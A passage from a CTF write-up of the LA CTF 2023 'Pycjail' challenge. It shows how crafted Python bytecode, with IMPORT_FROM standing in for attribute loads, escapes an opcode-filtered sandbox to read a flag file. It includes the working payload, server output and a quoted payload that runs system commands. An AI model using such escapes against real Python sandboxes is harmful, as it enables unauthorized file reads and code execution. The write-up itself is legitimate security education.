</span><span class="code-line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;I never learned how to count past 3 &gt;:(&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">else</span><span class="token punctuation">:</span>
</span><span class="code-line">    f<span class="token punctuation">.</span>__code__ <span class="token operator">=</span> f<span class="token punctuation">.</span>__code__<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>
</span><span class="code-line">        co_stacksize<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>
</span><span class="code-line">        co_consts<span class="token operator">=</span>consts<span class="token punctuation">,</span>
</span><span class="code-line">        co_names<span class="token operator">=</span>names<span class="token punctuation">,</span>
</span><span class="code-line">        co_code<span class="token operator">=</span>code<span class="token punctuation">,</span>
</span><span class="code-line">    <span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;here goes!&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">    frame <span class="token operator">=</span> inspect<span class="token punctuation">.</span>currentframe<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">    p <span class="token operator">=</span> <span class="token keyword">print</span>
</span><span class="code-line">    r <span class="token operator">=</span> <span class="token builtin">repr</span>
</span><span class="code-line">    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        <span class="token keyword">if</span> k <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">&quot;p&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;r&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;f&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">            <span class="token keyword">del</span> frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span>k<span class="token punctuation">]</span>
</span><span class="code-line">    p<span class="token punctuation">(</span>r<span class="token punctuation">(</span>f<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>To summarize the code above, you provided the <code>co_consts</code>, <code>co_names</code>, and <code>co_code</code> bytes for a custom <code>code</code> object that was created and ran. The restrictions imposed were:</p>
<ul>
<li>max 3 consts</li>
<li>max 4 names</li>
<li>max 15 opcodes</li>
<li>opcodes can’t be in <code>[&#x27;IMPORT_NAME&#x27;, &#x27;MAKE_FUNCTION&#x27;, &#x27;STORE_SUBSCR&#x27;, &#x27;DELETE_SUBSCR&#x27;, &#x27;LOAD_BUILD_CLASS&#x27;, &#x27;LOAD_ASSERTION_ERROR&#x27;, &#x27;STORE_NAME&#x27;, &#x27;DELETE_NAME&#x27;, &#x27;STORE_ATTR&#x27;, &#x27;DELETE_ATTR&#x27;, &#x27;STORE_GLOBAL&#x27;, &#x27;DELETE_GLOBAL&#x27;, &#x27;LOAD_NAME&#x27;, &#x27;LOAD_ATTR&#x27;, &#x27;JUMP_FORWARD&#x27;, &#x27;JUMP_IF_FALSE_OR_POP&#x27;, &#x27;JUMP_IF_TRUE_OR_POP&#x27;, &#x27;JUMP_ABSOLUTE&#x27;, &#x27;POP_JUMP_IF_FALSE&#x27;, &#x27;POP_JUMP_IF_TRUE&#x27;, &#x27;LOAD_GLOBAL&#x27;, &#x27;JUMP_IF_NOT_EXC_MATCH&#x27;, &#x27;LOAD_FAST&#x27;, &#x27;STORE_FAST&#x27;, &#x27;DELETE_FAST&#x27;, &#x27;LOAD_CLOSURE&#x27;, &#x27;LOAD_DEREF&#x27;, &#x27;STORE_DEREF&#x27;, &#x27;DELETE_DEREF&#x27;, &#x27;LOAD_CLASSDEREF&#x27;, &#x27;LOAD_METHOD&#x27;]</code> (aka no import/makefunc/load/store/delete/jump)</li>
<li>opcode values can’t be &gt; 3</li>
</ul>
<p>Nothing about the flag was mentioned, so it was likely in <code>/flag.txt</code> or <code>./flag.txt</code>, or if they were evil they’d require you to get RCE to read the flag. I was banking on the fact that it was stored in <code>/flag.txt</code> or <code>./flag.txt</code>, so my goal was to get arbitrary read.</p>
<h3 id="approaching-the-problem"><a href="#approaching-the-problem" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Approaching the Problem</h3>
<p>I made a <a target="_blank" rel="noopener noreferrer" href="https://github.com/Legoclones/website/blob/main/source/static/lactf-pycjail/allowed.txt">list</a> of all the Python 3.10 opcodes that <em>were</em> allowed in this jail by pulling from <a target="_blank" rel="noopener noreferrer" href="https://docs.python.org/3.10/library/dis.html">the documentation</a> and removing the opcodes banned in the list above. What caught my eye initially was that the opcodes <code>CALL_FUNCTION</code> and <code>CALL_METHOD</code> were <strong>not</strong> banned, and this is what allows you to call a function on the stack. However, the hard part was <em>getting</em> a callable object on the stack in the first place. The opcodes <code>LOAD_GLOBAL</code>, <code>LOAD_NAME</code>, <code>LOAD_METHOD</code>, and <code>LOAD_ATTR</code> are typically used to get a function on the stack, and all <code>LOAD</code> opcodes were blocked except for <code>LOAD_CONST</code> (which only allowed us to put strings on the stack). As an example, below shows the bytecode for the line <code>open(&quot;flag.txt&quot;).read()</code>:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> dis<span class="token punctuation">.</span>dis<span class="token punctuation">(</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">&#x27;open(&quot;flag.txt&quot;).read()&#x27;</span><span class="token punctuation">,</span><span class="token string">&#x27;pycjail&#x27;</span><span class="token punctuation">,</span><span class="token string">&#x27;eval&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">  <span class="token number">1</span>           <span class="token number">0</span> LOAD_NAME                <span class="token number">0</span> <span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">)</span>
</span><span class="code-line">              <span class="token number">2</span> LOAD_CONST               <span class="token number">0</span> <span class="token punctuation">(</span><span class="token string">&#x27;flag.txt&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">              <span class="token number">4</span> CALL_FUNCTION            <span class="token number">1</span>
</span><span class="code-line">              <span class="token number">6</span> LOAD_METHOD              <span class="token number">1</span> <span class="token punctuation">(</span>read<span class="token punctuation">)</span>
</span><span class="code-line">              <span class="token number">8</span> CALL_METHOD              <span class="token number">0</span>
</span><span class="code-line">             <span class="token number">10</span> RETURN_VALUE
</span></code></pre></div>
<p>To test various payloads with the provided <code>main.py</code> script, I created this small script to give me the info I want:</p>
<div class="relative"><pre><code class="language-python3 code-highlight"><span class="code-line">import dis
</span><span class="code-line">
</span><span class="code-line">code_str = &#x27;print(&quot;a&quot;)&#x27;
</span><span class="code-line">code = compile(code_str, &#x27;&lt;string&gt;&#x27;, &#x27;exec&#x27;)
</span><span class="code-line">
</span><span class="code-line">dis.dis(code)
</span><span class="code-line">
</span><span class="code-line">print(&quot;\nconsts: &quot;, code.co_consts)
</span><span class="code-line">print(&quot;names: &quot;, code.co_names)
</span><span class="code-line">print(&quot;code: &quot;, code.co_code.hex())
</span></code></pre></div>
<p>Based on the provided <code>code_str</code>, it would show me a disassembly of the code, along with <code>co_consts</code>, <code>co_names</code>, and <code>co_code</code> in the form desired.</p>
<p>Now that I was set up to try stuff, I went through the Python bytecode documentation, opcode by opcode, trying to see if there was anything that would put a callable on the stack. Many of the opcodes were eliminated from the start, such as <code>BINARY_*</code>, <code>UNARY_*</code>, <code>INPLACE_*</code>, <code>POP_*</code>, <code>ROT_*</code>, and <code>DUP_*</code>. <code>CALL_*</code> were going to be useful later on, but wouldn’t help us get a callable onto the stack. After spending about an hour with a teammate looking through the opcodes, we felt like there wasn’t anything there. So we did what anyone would do and asked ChatGPT (no, it wasn’t helpful).</p>
<p><img src="https://raw.githubusercontent.com/Legoclones/website/main/source/static/lactf-pycjail/chatgpt.png" alt="ChatGPT For the Rescue?"/></p>
<h3 id="turning-point"><a href="#turning-point" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Turning Point</h3>
<p>Desperate, we did some more research online with CTF writeups until I came across <a target="_blank" rel="noopener noreferrer" href="https://kmh.zone/blog/2021/02/07/ti1337-plus-ce/#another-way-to-leak">a write-up by kmh from DiceCTF 2021</a>. The challenge <code>TI-1337 Plus CE</code> was also a pyjail, and one of the things I learned was that &quot;<code>IMPORT_FROM</code> is <code>LOAD_ATTR</code> in disguise!&quot;.</p>
<p>The opcode <code>IMPORT_FROM</code> was <strong>not banned</strong>, but we hadn’t paid much attention to it because it always follows (and only functions properly with) the opcode <code>IMPORT_NAME</code>, which was banned. However, if we could use it to function as <code>LOAD_ATTR</code>, then that means we could get a callable onto the stack, and through attribute stacking run some code like <code>&quot;&quot;.__class__.__base__.__subclasses__()[144]()._module.__builtins__[&quot;eval&quot;](&quot;insert code here&quot;)</code>.</p>
<p>It was also apparent that since using <code>IMPORT_FROM</code> in place of <code>LOAD_ATTR</code> isn’t any default behavior for the Python interpreter, we would have to manually create custom bytecode to be successful. This actually made sense; normally, pyjails just ask for a line of code (single <code>input()</code> call), but this one had you specify certain parts of the <code>code</code> object you wanted to create. However, understanding the Python bytecode wouldn’t be <em>typical</em> or even perhaps <strong>technically compliant</strong> explained the challenge author’s design choice.</p>
<p>Manual testing confirmed our suspicion that <code>IMPORT_FROM</code> worked as desired, so it was now time to create a payload.</p>
<h3 id="developing-a-payload-with-restrictions"><a href="#developing-a-payload-with-restrictions" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Developing a Payload With Restrictions</h3>
<p>A lot of testing and trial &amp; error was performed at this point to get a payload that would work. Getting the payload <code>&quot;&quot;.__class__.__base__.__subclasses__</code> to work was fairly simple, however we ran into errors doing <code>&quot;&quot;.__class__.__base__.__subclasses__()</code>.</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">$ python3 main.py
</span><span class="code-line">consts: <span class="token string">&#x27;&#x27;</span>
</span><span class="code-line">names: __class__,__base__,__subclasses__
</span><span class="code-line">code: 64006d006d016d025300
</span><span class="code-line">here goes<span class="token operator">!</span>
</span><span class="code-line"><span class="token operator">&lt;</span>built-in method __subclasses__ of <span class="token builtin class-name">type</span> object at 0x55bf92bc364<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>
</span><span class="code-line">
</span><span class="code-line">$ python3 main.py
</span><span class="code-line">consts: <span class="token string">&#x27;&#x27;</span>
</span><span class="code-line">names: __class__,__base__,__subclasses__
</span><span class="code-line">code: 64006d006d016d02a1005300
</span><span class="code-line">here goes<span class="token operator">!</span>
</span><span class="code-line">Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span>:
</span><span class="code-line">  File <span class="token string">&quot;/home/justin/tmp/lactf/main.py&quot;</span>, line <span class="token number">51</span>, <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">&gt;</span>
</span><span class="code-line">    p<span class="token punctuation">(</span>r<span class="token punctuation">(</span>f<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span>
</span><span class="code-line">  File <span class="token string">&quot;/home/justin/tmp/lactf/main.py&quot;</span>, line -1, <span class="token keyword">in</span> f
</span><span class="code-line">TypeError: object<span class="token punctuation">(</span><span class="token punctuation">)</span> takes no arguments
</span></code></pre></div>
<p>The opcode used above was <code>CALL_METHOD</code>, so I tried <code>CALL_FUNCTION</code> and it works! Apparently the two ways for calling functions is by pairing <code>LOAD_METHOD</code> and <code>CALL_METHOD</code>, or <code>LOAD_ATTR</code> and <code>CALL_FUNCTION</code>.</p>
<p>The next issue we ran into was getting a number on the stack. Because <code>main.py</code> used the <code>input()</code> function to get the data, everything was treated as a string. Inserting <code>1</code> as a const would always have it render as <code>&#x27;1&#x27;</code>. After some research, we settled on the <code>GET_LEN</code> opcode, which just ran the <code>len()</code> function on the item on top of the stack. Since our first constant was just an empty string, and the actual value of the string didn’t matter (aka <code>&quot;&quot;.__class__</code> and <code>&quot;abcd&quot;.__class__</code> are the same), we could load that const onto the stack again and run <code>GET_LEN</code> to put the length of that string onto the stack. We could just set the length of the initial string to whatever we want to obtain the desired integer.</p>
<p>However, a second hiccup was encountered that required 2 additional opcodes to bypass. <code>GET_LEN</code> pushed the integer we wanted onto the stack, but kept the loaded string on there too, which we didn’t want. I had to insert an extra <code>ROT_TWO</code> and <code>POP_TOP</code> opcode to switch the order and remove the string from the opcode.</p>
<p>At this point, the payload we had was:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">Python code: &#x27;aaaa...aaa&#x27;.__class__.__base__.__subclasses__()[14]
</span><span class="code-line">
</span><span class="code-line">consts: aaaa...aaa
</span><span class="code-line">names: __class__,__base__,__subclasses__
</span><span class="code-line">code: 64006d006d016d02830064001e000200010019005300
</span><span class="code-line">
</span><span class="code-line">
</span><span class="code-line">Disassembly:
</span><span class="code-line">6400 -&gt; LOAD_CONST, consts[0] -&gt; &#x27;aaaa...aaa&#x27;
</span><span class="code-line">6d00 -&gt; IMPORT_FROM, names[0] -&gt; __class__
</span><span class="code-line">6d01 -&gt; IMPORT_FROM, names[1] -&gt; __base__
</span><span class="code-line">6d02 -&gt; IMPORT_FROM, names[2] -&gt; __subclasses__
</span><span class="code-line">8300 -&gt; CALL_FUNCTION
</span><span class="code-line">6400 -&gt; LOAD_CONST, consts[0] -&gt; &#x27;aaaa...aaa&#x27;
</span><span class="code-line">1e00 -&gt; GET_LEN -&gt; 14 or whatever we want
</span><span class="code-line">0200 -&gt; ROT_TWO
</span><span class="code-line">0100 -&gt; POP_TOP
</span><span class="code-line">1900 -&gt; BINARY_SUBSCR
</span><span class="code-line">5300 -&gt; RETURN_VALUE
</span></code></pre></div>
<p>We had <strong>2 consts, 1 name, and 4 opcodes</strong> left to get what we wanted, but we had access to <a target="_blank" rel="noopener noreferrer" href="https://github.com/Legoclones/website/blob/main/source/static/lactf-pycjail/classes.txt">an extensive list of classes</a> that opened up functionality a lot.</p>
<p>The &quot;stereotypical&quot; payload <a target="_blank" rel="noopener noreferrer" href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#no-builtins">from HackTricks</a> is to use <code>&#x27;&#x27;.__class__.__bases__.__subclasses__()[144]()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;ls&#x27;)</code> to run system commands (note that this was slightly modified from the Python2 version, and the exact index of <code>&lt;class &#x27;warnings.catch_warnings&#x27;&gt;</code> may vary depending on your installation &amp; version). The problem with this payload was it required another 3 names (<code>_module</code>, <code>__builtins__</code>, <code>system</code>) and 3 consts (<code>&#x27;__import__&#x27;</code>, <code>&#x27;os&#x27;</code>, <code>&#x27;ls&#x27;</code>), which we didn’t have. We considered making our first const of length 144 the same as our last const (padding our bash payload with extra <code>;</code>s until we reached our desired length), but we still had 2 extra names.</p>
<p>Our second thought was <code>&quot;&quot;.__class__.__base__.__subclasses__()[144]()._module.__builtins__[&quot;eval&quot;](&quot;insert code here&quot;)</code>, but that required 2 names and 2 consts (still 1 too many names).</p>
<p>After perusing the list of available classes one by one, I started looking into the class at index 118, which was <code>&lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;</code>. Looking at this class’s attributes, I saw the function <code>get_data()</code>, which required two arguments for the path of a file. Excited, I wrote up and tested the code <code>(&quot;a&quot;*118).__class__.__base__.__subclasses__()[118].get_data(&#x27;flag.txt&#x27;,&#x27;flag.txt&#x27;)</code>, and my local flag was printed! This only required 1 extra name and const (we even had one const leftover), and used exactly 4 more opcodes.</p>
<h3 id="final-payload"><a href="#final-payload" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Final Payload</h3>
<p>The final payload was:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">&#x27;&#x27;.__class__.__base__.__subclasses__()[118].get_data(&#x27;flag.txt&#x27;,&#x27;flag.txt&#x27;)
</span><span class="code-line">
</span><span class="code-line">consts: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,flag.txt
</span><span class="code-line">names: __class__,__base__,__subclasses__,get_data
</span><span class="code-line">code: 64006d006d016d02830064001e000200010019006d036401640183025300
</span><span class="code-line">
</span><span class="code-line">6400 -&gt; LOAD_CONST, consts[0] -&gt; &#x27;a&#x27;
</span><span class="code-line">6d00 -&gt; IMPORT_FROM, names[0] -&gt; __class__
</span><span class="code-line">6d01 -&gt; IMPORT_FROM, names[1] -&gt; __base__
</span><span class="code-line">6d02 -&gt; IMPORT_FROM, names[2] -&gt; __subclasses__
</span><span class="code-line">8300 -&gt; CALL_FUNCTION
</span><span class="code-line">6400 -&gt; LOAD_CONST, consts[0] -&gt; &#x27;a&#x27;
</span><span class="code-line">1e00 -&gt; GET_LEN -&gt; 1
</span><span class="code-line">0200 -&gt; ROT_TWO
</span><span class="code-line">0100 -&gt; POP_TOP
</span><span class="code-line">1900 -&gt; BINARY_SUBSCR
</span><span class="code-line">6d03 -&gt; IMPORT_FROM, names[3] -&gt; get_data
</span><span class="code-line">6401 -&gt; LOAD_CONST, consts[1] -&gt; &#x27;flag.txt&#x27;
</span><span class="code-line">6401 -&gt; LOAD_CONST, consts[1] -&gt; &#x27;flag.txt&#x27;
</span><span class="code-line">8302 -&gt; CALL_FUNCTION
</span><span class="code-line">5300 -&gt; RETURN_VALUE
</span></code></pre></div>
<p>And server interaction:</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">~/tmp/lactf $ <span class="token function">nc</span> lac.tf <span class="token number">31130</span>
</span><span class="code-line">consts: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,flag.txt
</span><span class="code-line">names: __class__,__base__,__subclasses__,get_data
</span><span class="code-line">code: 64006d006d016d02830064001e000200010019006d036401640183025300
</span><span class="code-line">here goes<span class="token operator">!</span>
</span><span class="code-line">b<span class="token string">&#x27;flag{maybe i should_only_allow_nops_next_time}\n&#x27;</span>
</span></code></pre></div>
<p><strong>Flag:</strong> <code>flag{maybe_i_should_only_allow_nops_next_time}</code></p></div><div class="pt-6 pb-6 text-sm text-gray-700 dark:text-gray-300"><a target="_blank" rel="nofollow" href="https://mobile.twitter.com/search?q=https%3A%2F%2Fsekai.team%2Fblog%2Flactf-2023%2Fpycjail">Discuss on Twitter</a> • <a target="_blank" rel="noopener noreferrer" href="https://github.com/blueset/sekai.team/blob/master/data/blog/lactf-2023/pycjail.md">View on GitHub</a></div></div><footer><div class="text-sm font-medium leading-5 divide-gray-200 xl:divide-y dark:divide-gray-700 xl:col-start-1 xl:row-start-2"><div class="py-4 xl:py-8"><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Originally published on</h2><div class="flex flex-wrap text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a target="_blank" rel="noopener noreferrer" href="https://justinapplegate.me/2023/lactf-pycjail">justinapplegate.me</a></div></div><div class="py-4 xl:py-8"><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Tags</h2><div class="flex flex-wrap"><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/lactf-2023/">LACTF-2023</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/misc/">Misc</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/python/">Python</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/pyjail/">Pyjail</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/sandbox/">Sandbox</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/opcode/">Opcode</a></div></div><div class="flex justify-between py-4 xl:block xl:space-y-8 xl:py-8"><div><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Previous Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/lactf-2023/snek/">LA CTF 2023 – Snek</a></div></div><div><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Next Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/utctf-2023/zipper/">UT CTF 2023 – Zipper</a></div></div></div></div><div class="pt-4 xl:pt-8"><a class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/blog/">← Back to the blog</a></div></footer></div></div></article></div></main><footer><div class="flex flex-col items-center mt-16"><div class="flex mb-3 space-x-4"><div class="flex mb-3 space-x-4"><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="mailto:project.sekai@sekai.team"><span class="sr-only"><span class="w-6">mail</span></span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M2.003 5.884 10 9.882l7.997-3.998A2 2 0 0 0 16 4H4a2 2 0 0 0-1.997 1.884z"></path><path d="m18 8.118-8 4-8-4V14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8.118z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://github.com/project-sekai-ctf"><span class="sr-only"><span class="w-6">github</span></span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://www.linkedin.com/company/project-sekai-ctf/"><span class="sr-only"><span class="w-6">linkedin</span></span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://twitter.com/ProjectSEKAIctf"><span class="sr-only"><span class="w-6">twitter</span></span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M23.953 4.57a10 10 0 0 1-2.825.775 4.958 4.958 0 0 0 2.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 0 0-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 0 0-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 0 1-2.228-.616v.06a4.923 4.923 0 0 0 3.946 4.827 4.996 4.996 0 0 1-2.212.085 4.936 4.936 0 0 0 4.604 3.417 9.867 9.867 0 0 1-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 0 0 7.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0 0 24 4.59z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://ctftime.org/team/169557"><span class="sr-only"><span class="w-6">ctftime</span></span><svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M24 0v24H0V0h24Zm-3.077 3.077L7.067 3.076 16 12.816 10.369 19l-2.195-2.612 3.476-3.573-8.574-9.609v17.717h17.847V3.077Z" fill="currentColor" fill-rule="evenodd"></path></svg></a></div></div><div class="flex mb-2 space-x-2 text-sm text-gray-500 dark:text-gray-400"><a href="/">Project SEKAI</a><div> • </div><div>© 2024</div><div> • </div><div><a href="https://1a23.com">1A23 Studio</a></div></div><div class="mb-8 text-xs text-center text-gray-200 dark:text-gray-700">This website is in no way affiliated with any of the following individuals or organizations.<!-- --> <a target="_blank" rel="noopener noreferrer" href="https://github.com/timlrx/tailwind-nextjs-starter-blog">Tailwind Nextjs Theme</a> © Timothy Lim and contributors; <a target="_blank" rel="noopener noreferrer" href="https://pjsekai.sega.jp/">Project SEKAI: Colorful Stage! feat. Hatsune Miku</a> © SEGA / © Craft Egg Inc. Developed by Colorful Palette; <a target="_blank" rel="noopener noreferrer" href="https://ec.crypton.co.jp/pages/prod/virtualsinger">Character Vocal Series</a> © Crypton Future Media, INC. <a target="_blank" rel="noopener noreferrer" href="https://www.piapro.net">www.piapro.net</a> All rights reserved.</div></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"mdxSource":"var Component=(()=\u003e{var d=Object.create;var l=Object.defineProperty;var r=Object.getOwnPropertyDescriptor;var h=Object.getOwnPropertyNames;var p=Object.getPrototypeOf,m=Object.prototype.hasOwnProperty;var t=a=\u003el(a,\"__esModule\",{value:!0});var u=(a,s)=\u003e()=\u003e(s||a((s={exports:{}}).exports,s),s.exports),N=(a,s)=\u003e{t(a);for(var c in s)l(a,c,{get:s[c],enumerable:!0})},k=(a,s,c)=\u003e{if(s\u0026\u0026typeof s==\"object\"||typeof s==\"function\")for(let n of h(s))!m.call(a,n)\u0026\u0026n!==\"default\"\u0026\u0026l(a,n,{get:()=\u003es[n],enumerable:!(c=r(s,n))||c.enumerable});return a},_=a=\u003ek(t(l(a!=null?d(p(a)):{},\"default\",a\u0026\u0026a.__esModule\u0026\u0026\"default\"in a?{get:()=\u003ea.default,enumerable:!0}:{value:a,enumerable:!0})),a);var o=u((O,i)=\u003e{i.exports=_jsx_runtime});var w={};N(w,{default:()=\u003ey,frontmatter:()=\u003eg});var e=_(o()),g={title:\"LA CTF 2023 \\u2013 Pycjail\",date:\"2023-02-12\",draft:!1,authors:[\"legoclones\"],tags:[\"LACTF 2023\",\"Misc\",\"Python\",\"Pyjail\",\"Sandbox\",\"Opcode\"],summary:\"Use bytecode manipulation to subvert jail restrictions.\",canonical:\"https://justinapplegate.me/2023/lactf-pycjail\"};function b(a={}){let{wrapper:s}=a.components||{};return s?(0,e.jsx)(s,Object.assign({},a,{children:(0,e.jsx)(c,{})})):c();function c(){let n=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",blockquote:\"blockquote\",p:\"p\",code:\"code\",pre:\"pre\",ul:\"ul\",li:\"li\",h3:\"h3\",em:\"em\",strong:\"strong\",img:\"img\"},a.components);return(0,e.jsxs)(e.Fragment,{children:[(0,e.jsxs)(n.h2,{id:\"pycjail-misc-495-points\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#pycjail-misc-495-points\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Pycjail (Misc, 495 Points)\"]}),`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsx)(n.p,{children:\"All of you think you\\u2019re so cute with your fancy little sandbox bypasses, but jokes on you I\\u2019ve started filtering the bytecode! I\\u2019d like to see you bypass this!\"}),`\n`,(0,e.jsx)(n.p,{children:\"Note: The program is being run in the python:3.10-slim-bullseye Docker image on the server.\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"Attachment: \",(0,e.jsx)(n.a,{href:\"https://github.com/Legoclones/website/blob/main/source/static/lactf-pycjail/main.py\",children:\"main.py\"})]}),`\n`]}),`\n`,(0,e.jsxs)(n.p,{children:[\"This challenge required you to bypass a Python jail, which limited several aspects of a custom \",(0,e.jsx)(n.code,{children:\"code\"}),\" object you created. The source code:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python 